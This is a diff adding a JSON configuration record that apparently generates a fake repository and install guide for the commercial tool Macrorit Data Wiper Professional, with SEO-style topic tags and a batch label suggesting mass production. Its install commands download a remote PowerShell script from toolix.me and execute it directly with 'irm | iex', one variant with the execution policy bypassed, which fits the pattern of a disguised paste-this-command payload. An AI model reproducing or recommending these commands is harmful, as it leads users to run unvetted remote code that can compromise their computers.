@@ -1,0 +1,26 @@
+{
+  "repo": "Macrorit-Data-Wiper-Professional",
+  "product": "Macrorit Data Wiper Professional",
+  "product_title": "Macrorit Data Wiper Professional",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-macrorit-data-wiper",
+    "macrorit-data-wiper-app",
+    "repository-readme",
+    "install-guide",
+    "desktop-software",
+    "macrorit-data-wiper-desktop-tool",
+    "macrorit-data-wiper-windows-tool",
+    "macrorit-data-wiper",
+    "windows-11",
+    "windows-desktop"
+  ],
+  "site": "toolix.me"
+}
